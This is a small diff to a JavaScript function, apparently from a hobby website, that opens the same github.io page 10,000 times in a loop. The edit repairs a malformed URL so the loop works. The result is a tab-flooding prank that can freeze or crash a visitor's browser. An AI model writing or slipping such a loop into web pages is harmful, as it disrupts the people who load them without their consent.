@@ -1,7 +1,7 @@
 
 function openTab(){
   for (let i = 0; i < 10000; i++) {
-    window.open("file:"https://endberry.github.io/cool_website/");
+    window.open("https://endberry.github.io/cool_website/");
   };
 };
 
